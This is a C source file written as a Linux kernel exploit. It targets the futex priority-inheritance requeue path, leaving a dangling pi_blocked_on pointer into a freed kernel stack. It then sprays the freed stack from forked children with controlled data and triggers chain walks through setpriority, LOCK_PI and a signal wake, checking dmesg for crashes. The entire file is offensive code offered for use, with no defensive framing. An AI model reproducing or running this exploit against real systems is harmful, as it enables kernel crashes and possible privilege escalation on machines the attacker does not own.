// No-ptrace exploit: signal-based wake + controlled offset 88
// Uses sigaction without SA_RESTART for clean EINTR return
// Goal: trigger chain walk → read freed+reused stack → crash/controlled behavior
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <pthread.h>
#include <errno.h>
#include <signal.h>
#include <sys/syscall.h>
#include <sys/mman.h>
#include <sys/wait.h>
#include <sys/prctl.h>
#include <sys/resource.h>
#include <sys/xattr.h>
#include <linux/futex.h>
#include <stdint.h>
#include <string.h>
#include <time.h>

static volatile uint32_t *f1,*f2,*f3;
static volatile int *go, *waiter_ok, *waiter_woken, *blocker_ready;
static volatile pid_t *waiter_tid, *blocker_tid;
static volatile int *main_exit_done;

// Signal handler for SIGUSR1 — just mark woken, no restart
static void sigusr1_handler(int sig, siginfo_t *info, void *ctx) {
    __atomic_store_n(waiter_woken, 1, __ATOMIC_RELEASE);
}

void *waiter_fn(void *a){
    *waiter_tid = syscall(__NR_gettid);

    // Install signal handler WITHOUT SA_RESTART
    struct sigaction sa = {
        .sa_sigaction = sigusr1_handler,
        .sa_flags = SA_SIGINFO  // no SA_RESTART!
    };
    sigemptyset(&sa.sa_mask);
    sigaction(SIGUSR1, &sa, NULL);

    syscall(__NR_futex, f3, FUTEX_LOCK_PI, 0, NULL, NULL, 0);
    __atomic_store_n(waiter_ok, 1, __ATOMIC_RELEASE);

    // Block here — will return EINTR on SIGUSR1 (no SA_RESTART)
    int r = syscall(__NR_futex, f1, FUTEX_WAIT_REQUEUE_PI, 0, NULL, f2, 0);
    printf("[W] Woken: ret=%d err=%d (pi_blocked_on into freed stack)\n", r, r<0?errno:0);
    __atomic_store_n(waiter_woken, 1, __ATOMIC_RELEASE);
    while(1) usleep(100000);
    return NULL;
}

void *blocker_fn(void *a){
    *blocker_tid = syscall(__NR_gettid);
    while(!__atomic_load_n(go,__ATOMIC_ACQUIRE)) usleep(1000);
    syscall(__NR_futex, f2, FUTEX_LOCK_PI, 0, NULL, NULL, 0);
    __atomic_store_n(blocker_ready, 1, __ATOMIC_RELEASE);
    syscall(__NR_futex, f3, FUTEX_LOCK_PI, 0, NULL, NULL, 0);
    printf("[B] LOCK_PI(f3) returned\n");
    while(1) usleep(100000);
    return NULL;
}

void *main_thread_fn(void *a) {
    while(!__atomic_load_n(waiter_ok,__ATOMIC_ACQUIRE)) usleep(1000);
    usleep(50000);
    __atomic_store_n(go, 1, __ATOMIC_RELEASE);
    while(*blocker_tid == 0) usleep(1000);
    usleep(100000);

    int ret = syscall(__NR_futex, f1, FUTEX_CMP_REQUEUE_PI, 1, (void*)1L, f2, *f1);
    printf("[M] CMP_REQUEUE_PI ret=%d err=%d\n", ret, errno);
    // BUG: pi_blocked_on is now dangling (proxy_waiter on THIS stack)

    __atomic_store_n(main_exit_done, 1, __ATOMIC_RELEASE);
    usleep(200000);

    printf("[M] pthread_exit — freeing MY kernel stack\n");
    pthread_exit(NULL);
    return NULL;
}

int main(int argc, char **argv){
    setvbuf(stdout, NULL, _IONBF, 0);
    printf("[*] Signal-wake: no ptrace, sigaction without SA_RESTART\n");

    f1=mmap(NULL,4096,PROT_READ|PROT_WRITE,MAP_ANONYMOUS|MAP_SHARED,-1,0);
    f2=mmap(NULL,4096,PROT_READ|PROT_WRITE,MAP_ANONYMOUS|MAP_SHARED,-1,0);
    f3=mmap(NULL,4096,PROT_READ|PROT_WRITE,MAP_ANONYMOUS|MAP_SHARED,-1,0);
    go=mmap(NULL,4096,PROT_READ|PROT_WRITE,MAP_ANONYMOUS|MAP_SHARED,-1,0);
    waiter_ok=mmap(NULL,4096,PROT_READ|PROT_WRITE,MAP_ANONYMOUS|MAP_SHARED,-1,0);
    waiter_woken=mmap(NULL,4096,PROT_READ|PROT_WRITE,MAP_ANONYMOUS|MAP_SHARED,-1,0);
    blocker_ready=mmap(NULL,4096,PROT_READ|PROT_WRITE,MAP_ANONYMOUS|MAP_SHARED,-1,0);
    main_exit_done=mmap(NULL,4096,PROT_READ|PROT_WRITE,MAP_ANONYMOUS|MAP_SHARED,-1,0);
    waiter_tid=mmap(NULL,4096,PROT_READ|PROT_WRITE,MAP_ANONYMOUS|MAP_SHARED,-1,0);
    blocker_tid=mmap(NULL,4096,PROT_READ|PROT_WRITE,MAP_ANONYMOUS|MAP_SHARED,-1,0);
    *f1=0;*f2=0;*f3=0;*go=0;*waiter_ok=0;*waiter_woken=0;*blocker_ready=0;
    *main_exit_done=0;*waiter_tid=0;*blocker_tid=0;

    pid_t child = fork();
    if (child == 0) {
        pthread_t w, b, m;
        pthread_create(&w, NULL, waiter_fn, NULL);
        while(!__atomic_load_n(waiter_ok,__ATOMIC_ACQUIRE)) usleep(1000);
        usleep(30000);
        __atomic_store_n(go, 1, __ATOMIC_RELEASE);
        pthread_create(&b, NULL, blocker_fn, NULL);
        while(*blocker_tid == 0) usleep(1000);
        pthread_create(&m, NULL, main_thread_fn, NULL);
        pthread_join(m, NULL);
        printf("[C] Main thread joined. Stack freed.\n");
        sleep(3); // RCU grace period
        printf("[C] Ready for parent trigger.\n");
        while(1) sleep(10);
        _exit(0);
    }

    while(*waiter_tid == 0 || *blocker_tid == 0) usleep(10000);
    printf("[P] Waiter=%d Blocker=%d Child=%d\n", *waiter_tid, *blocker_tid, child);
    while(!*main_exit_done) usleep(10000);
    usleep(500000);
    printf("[P] Main thread exited. Waiting RCU+spray...\n");
    sleep(3);

    // SPRAY: reuse freed stack pages with controlled data
    for (int i = 0; i < 1000; i++) {
        pid_t sp = fork();
        if (sp == 0) {
            volatile char big[16384]; // 16KB = kernel stack page size
            // Fill with specific pattern to identify and control offset 88
            for (int off = 0; off < (int)sizeof(big); off += 8)
                *(volatile uint64_t*)(big + off) = 0xDEAD000000000000ULL | (uint64_t)off;
            // Overwrite offset 80-96 (task+lock) with ZERO
            memset((void*)(big + 80), 0x00, 32);
            // Deep kernel frames
            for (int j = 0; j < 200; j++) {
                syscall(__NR_getpid); syscall(__NR_gettid);
            }
            _exit(0);
        }
        if (sp > 0) waitpid(sp, NULL, 0);
    }
    printf("[P] 1000 children sprayed. Triggering...\n");

    // === TRIGGER 1: setpriority on still-blocked waiter ===
    // No ptrace needed — waiter is in FUTEX_WAIT_REQUEUE_PI
    printf("[P] setpriority chain walk (waiter still blocked)...\n");
    for (int i = 0; i < 30; i++) {
        int r = setpriority(PRIO_PROCESS, *waiter_tid, i);
        if (i == 0) printf("[P] setpriority(0) = %d err=%d\n", r, errno);
    }

    // === TRIGGER 2: LOCK_PI on f2 (walks PI chain from f2) ===
    struct timespec ts = {.tv_sec = 0, .tv_nsec = 200000000};
    int r = syscall(__NR_futex, f2, FUTEX_LOCK_PI, 0, &ts, NULL, 0);
    printf("[P] LOCK_PI(f2) = %d err=%d\n", r, errno);

    // === TRIGGER 3: Signal-wake waiter (no ptrace!) ===
    printf("[P] Sending SIGUSR1 to waiter...\n");
    syscall(__NR_tgkill, child, *waiter_tid, SIGUSR1);
    usleep(200000);
    if (*waiter_woken) printf("[P] Waiter woken by signal!\n");

    // === TRIGGER 4: Additional chain walks after wake ===
    for (int i = 0; i < 10; i++)
        setpriority(PRIO_PROCESS, *waiter_tid, i);

    r = syscall(__NR_futex, f3, FUTEX_TRYLOCK_PI, 0, NULL, NULL, 0);
    printf("[P] TRYLOCK_PI(f3) = %d err=%d\n", r, errno);
    r = syscall(__NR_futex, f2, FUTEX_TRYLOCK_PI, 0, NULL, NULL, 0);
    printf("[P] TRYLOCK_PI(f2) = %d err=%d\n", r, errno);

    usleep(200000);

    // Check dmesg
    printf("[P] === DMESG ===\n");
    system("dmesg | grep -E '_raw_spin|futex_top_waiter|BUG.*NULL|Oops|protection|Call trace' | head -15 || echo 'No crash'");

    kill(child, SIGKILL); waitpid(child, NULL, 0);
    printf("[P] Done\n");
    return 0;
}
